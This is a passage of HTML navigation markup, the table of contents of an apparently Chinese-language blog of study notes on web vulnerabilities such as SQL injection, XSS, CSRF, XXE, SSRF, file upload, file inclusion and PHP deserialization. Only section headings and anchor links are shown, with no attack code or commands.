class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8E%9F%E7%90%86"><span class="nav-number">1.10.1.</span> <span class="nav-text">1.暴力破解原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-9"><span class="nav-number">1.10.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-9"><span class="nav-number">1.10.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81Deserialization-Vulnerabilities%EF%BC%88PHP%EF%BC%89"><span class="nav-number">1.11.</span> <span class="nav-text">十一、Deserialization Vulnerabilities（PHP）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Deserialization-Vulnerabilities%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.11.1.</span> <span class="nav-text">1.Deserialization Vulnerabilities漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-10"><span class="nav-number">1.11.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-10"><span class="nav-number">1.11.3.</span> <span class="nav-text">3.防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%AD%BE%E5%90%8D%E4%B8%8E%E8%AE%A4%E8%AF%81"><span class="nav-number">1.11.3.1.</span> <span class="nav-text">1)签名与认证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%99%90%E5%88%B6%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB"><span class="nav-number">1.11.3.2.</span> <span class="nav-text">2)限制序列化与反序列化的类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-RASP%E6%A3%80%E6%B5%8B"><span class="nav-number">1.11.3.3.</span> <span class="nav-text">3)RASP检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8"><span class="nav-number">1.11.4.</span> <span class="nav-text">4.利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-wakeup-%E7%BB%95%E8%BF%87"><span class="nav-number">1.11.4.1.</span> <span class="nav-text">1)__wakeup( )绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%B3%A8%E5%85%A5%E5%AF%B9%E8%B1%A1%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="nav-number">1.11.4.2.</span> <span class="nav-text">2)注入对象构造方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.11.4.3.</span> <span class="nav-text">3)Session反序列化漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-PHAR%E5%88%A9%E7%94%A8"><span class="nav-number">1.11.4.4.</span> <span class="nav-text">4)PHAR利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81rce%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.12.</span> <span class="nav-text">十二、rce漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-rce%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.12.1.</span> <span class="nav-text">1.rce漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-11"><span class="nav-number">1.12.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-11"><span class="nav-number">1.12.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81ssti%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.13.</span> <span class="nav-text">十三、ssti漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ssti%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.13.1.</span> <span class="nav-text">1.ssti漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-12"><span class="nav-number">1.13.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-12"><span class="nav-number">1.13.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">漏洞知识点记录笔记（一）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81sql"><span class="nav-number">2.1.</span> <span class="nav-text">一、sql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">2.1.1.</span> <span class="nav-text">sql注入的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%8C%89%E7%85%A7%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">1.按照数据提交的方式来分类：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ps-%E4%B8%8B%E9%9D%A2%E5%87%A0%E7%82%B9%E6%98%AF%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%BB%8F%E5%B8%B8%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">ps.下面几点是注入中经常会用到的语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%8C%89%E7%85%A7%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C%E6%9D%A5%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">2.按照执行效果来分类：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.1.1.3.1.</span> <span class="nav-text">（1）基于布尔的盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.1.1.3.2.</span> <span class="nav-text">（2）基于时间的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%87%BD%E6%95%B0%E6%88%96%E8%80%85%E6%96%B9%E6%B3%95"><span class="nav-number">2.1.1.3.2.1.</span> <span class="nav-text">时间盲注的函数或者方法</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.3.3.</span> <span class="nav-text">（3）基于报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.3.4.</span> <span class="nav-text">（4）联合查询注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E5%A0%86%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">2.1.1.3.5.</span> <span class="nav-text">（5）堆查询注入（堆叠注入）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%886%EF%BC%89%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.3.6.</span> <span class="nav-text">（6）宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%91%A2%E6%8C%89%E7%85%A7%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B%E6%9D%A5%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">③按照注入点类型来分类：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%91%A3%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%A6%E5%92%8C%E9%A1%BA%E5%BA%8F%E7%9A%84%E6%B3%A8%E5%85%A5-%E5%93%AA%E9%87%8C%E5%8F%91%E7%94%9F%E4%BA%86%E5%BD%B1%E5%93%8D"><span class="nav-number">2.1.1.5.</span> <span class="nav-text">④基于程度和顺序的注入(哪里发生了影响)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.6.</span> <span class="nav-text">1.堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="nav-number">2.1.1.6.1.</span> <span class="nav-text">1.堆叠注入定义</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.1.6.2.</span> <span class="nav-text">2.堆叠注入原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-number">2.1.1.6.3.</span> <span class="nav-text">3.堆叠注入的局限性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.7.</span> <span class="nav-text">2.无列名注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.8.</span> <span class="nav-text">*3.联合注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.2.</span> <span class="nav-text">1.几个常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E5%B0%9D%E8%AF%95%E7%9A%84%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.3.</span> <span class="nav-text">2.一般用于尝试的闭合语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-sql%E4%B8%AD%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E3%80%90%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%91"><span class="nav-number">2.1.4.</span> <span class="nav-text">3.sql中逻辑运算【万能密码的原理】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E3%80%90%E6%8C%89%E9%A1%BA%E5%BA%8F%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E3%80%91"><span class="nav-number">2.1.5.</span> <span class="nav-text">4.注入的一般流程【按顺序查询注入】</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ps-%E5%85%B3%E9%94%AE%E8%AE%B0%E5%BF%86%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">ps.关键记忆和使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">[1] 注入语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">2.1.5.3.</span> <span class="nav-text">[2] 注入流程图</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-mysql%E9%94%99%E8%AF%AF%E5%88%86%E6%9E%90%E8%A7%A3%E5%86%B3"><span class="nav-number">2.1.6.</span> <span class="nav-text">5.mysql错误分析解决</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%89%E5%AD%90%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%A4%9A%E4%BA%8E%E4%B8%80%E8%A1%8C"><span class="nav-number">2.1.6.1.</span> <span class="nav-text">1）子查询结果多于一行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ps-%E5%AD%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.6.2.</span> <span class="nav-text">ps. 子查询语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-mysql-%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0%EF%BC%8C-%E5%88%86%E7%BB%84%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.7.</span> <span class="nav-text">6.mysql 连接函数， 分组连接函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-concat"><span class="nav-number">2.1.7.0.1.</span> <span class="nav-text">1.concat()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-concat-ws"><span class="nav-number">2.1.7.0.2.</span> <span class="nav-text">2.concat_ws()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-group-concat"><span class="nav-number">2.1.7.0.3.</span> <span class="nav-text">3.group_concat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps-%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8"><span class="nav-number">2.1.7.0.4.</span> <span class="nav-text">ps. 组合使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2"><span class="nav-number">2.1.8.</span> <span class="nav-text">*7.过滤替换</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%89%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.8.1.</span> <span class="nav-text">1）双写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%BC%89%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88"><span class="nav-number">2.1.8.2.</span> <span class="nav-text">2）大小写混合</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%BC%89%E6%9B%BF%E6%8D%A2"><span class="nav-number">2.1.8.3.</span> <span class="nav-text">*3）替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">2.1.8.4.</span> <span class="nav-text">8. 注释符</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81xss"><span class="nav-number">2.2.</span> <span class="nav-text">二、xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dom-Xss%E8%BF%9B%E9%98%B6-%E5%96%84%E5%8F%98iframe"><span class="nav-number">2.2.1.</span> <span class="nav-text">Dom Xss进阶 [善变iframe]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%81%E6%98%8E%EF%BC%9A"><span class="nav-number">2.2.2.</span> <span class="nav-text">漏洞证明：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="nav-number">2.2.3.</span> <span class="nav-text">修复方案：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81csrf"><span class="nav-number">2.3.</span> <span class="nav-text">三、csrf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%89%E7%BB%95%E8%BF%87token"><span class="nav-number">2.3.1.</span> <span class="nav-text">1）绕过token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%EF%BC%89%E7%BB%95%E8%BF%87referer"><span class="nav-number">2.3.2.</span> <span class="nav-text">2）绕过referer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-referer%E6%9D%A1%E4%BB%B6%E4%B8%BA%E7%A9%BA%E6%9D%A1%E4%BB%B6%E6%97%B6"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">1.referer条件为空条件时</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A4%E6%96%ADReferer%E6%98%AF%E6%9F%90%E5%9F%9F%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">2.判断Referer是某域情况下绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%88%A4%E6%96%ADreferer%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%9F%90%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">2.3.2.3.</span> <span class="nav-text">3.判断referer是否存在某关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%88%A4%E6%96%ADReferer%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89%E6%9F%90%E5%9F%9F%E5%90%8D"><span class="nav-number">2.3.2.4.</span> <span class="nav-text">4.判断Referer是否含有某域名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%EF%BC%89%E4%B8%8D%E5%90%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.3.3.</span> <span class="nav-text">3）不同浏览器的区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81xxe"><span class="nav-number">2.4.</span> <span class="nav-text">四、xxe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E5%9C%A8%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89-DTD-%E4%B8%AD%E5%88%9B%E5%BB%BA%E5%AE%9E%E4%BD%93"><span class="nav-number">2.4.1.</span> <span class="nav-text">必须在文档类型定义 (DTD) 中创建实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-DOS%E6%94%BB%E5%87%BB"><span class="nav-number">2.4.2.</span> <span class="nav-text">XXE DOS攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8XXE"><span class="nav-number">2.4.3.</span> <span class="nav-text">盲注XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84DTD"><span class="nav-number">2.4.3.1.</span> <span class="nav-text">引用远程服务器上的DTD</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-%E4%BB%8B%E7%BB%8D%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.4.</span> <span class="nav-text">XXE 介绍与绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81ssrf"><span class="nav-number">2.5.</span> <span class="nav-text">五、ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%BD%93%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="nav-number">2.5.1.</span> <span class="nav-text">不当函数利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file-get-content"><span class="nav-number">2.5.1.1.</span> <span class="nav-text">file_get_content</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl-exec"><span class="nav-number">2.5.1.2.</span> <span class="nav-text">curl_exec</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93"><span class="nav-number">2.5.2.</span> <span class="nav-text">gopher协议总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">1)利用：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-GTE%E8%AF%B7%E6%B1%82"><span class="nav-number">2.5.2.2.</span> <span class="nav-text">2)GTE请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-POST%E8%AF%B7%E6%B1%82"><span class="nav-number">2.5.2.3.</span> <span class="nav-text">3)POST请求</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E7%9A%84POST%E8%AF%B7%E6%B1%82"><span class="nav-number">2.5.2.3.1.</span> <span class="nav-text">构造一个提交文件的POST请求</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E6%89%93FastCGI"><span class="nav-number">2.5.2.4.</span> <span class="nav-text">gopher打FastCGI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E6%89%93redis"><span class="nav-number">2.5.2.5.</span> <span class="nav-text">gopher打redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E6%89%93mysql"><span class="nav-number">2.5.2.6.</span> <span class="nav-text">gopher打mysql</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.6.</span> <span class="nav-text">六、文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%A4%9A%E9%87%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.1.</span> <span class="nav-text">1.多重过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="nav-number">2.6.1.1.</span> <span class="nav-text">短标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#user-ini"><span class="nav-number">2.6.1.2.</span> <span class="nav-text">.user.ini</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.6.2.</span> <span class="nav-text">2.文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.3.</span> <span class="nav-text">3.其他绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%89-DATA%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.3.1.</span> <span class="nav-text">1）::$DATA绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%BC%89%E7%82%B9-%E7%A9%BA%E6%A0%BC-%E7%82%B9%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.3.2.</span> <span class="nav-text">2）点+空格+点绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%BC%8900%E6%88%AA%E6%96%AD"><span class="nav-number">2.6.3.3.</span> <span class="nav-text">3）00截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%EF%BC%89%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">2.6.3.4.</span> <span class="nav-text">4）二次渲染+条件竞争</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.7.</span> <span class="nav-text">七、文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%9B%9B%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">2.7.1.</span> <span class="nav-text">1.文件包含的四个函数：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#require-once-%E5%A4%9A%E6%AC%A1%E5%8C%85%E5%90%AB"><span class="nav-number">2.7.1.1.</span> <span class="nav-text">*require_once()多次包含</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.7.2.</span> <span class="nav-text">2.php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-php-%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.7.2.1.</span> <span class="nav-text">1.php:&#x2F;&#x2F;协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-php-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.7.2.2.</span> <span class="nav-text">2.php:&#x2F;&#x2F;filter伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87base%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.2.2.1.</span> <span class="nav-text">绕过base过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AF%B9%E5%8F%82%E6%95%B0%E9%99%90%E5%88%B6"><span class="nav-number">2.7.2.2.2.</span> <span class="nav-text">绕过对参数限制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-php-input%EF%BC%88%E8%AF%BB%E5%8F%96POST%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-number">2.7.2.3.</span> <span class="nav-text">3.php:&#x2F;&#x2F;input（读取POST数据）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-file-%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%89"><span class="nav-number">2.7.2.4.</span> <span class="nav-text">4.file:&#x2F;&#x2F;伪协议（读取文件内容）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-phar-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E8%AF%BB%E5%8F%96%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">2.7.2.5.</span> <span class="nav-text">5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-zip-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.7.2.6.</span> <span class="nav-text">6.zip:&#x2F;&#x2F;伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-data-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.7.2.7.</span> <span class="nav-text">7.data:&#x2F;&#x2F;伪协议(读取文件)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-%E6%80%BB%E7%BB%93"><span class="nav-number">2.7.2.8.</span> <span class="nav-text">8.总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.3.</span> <span class="nav-text">3.绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 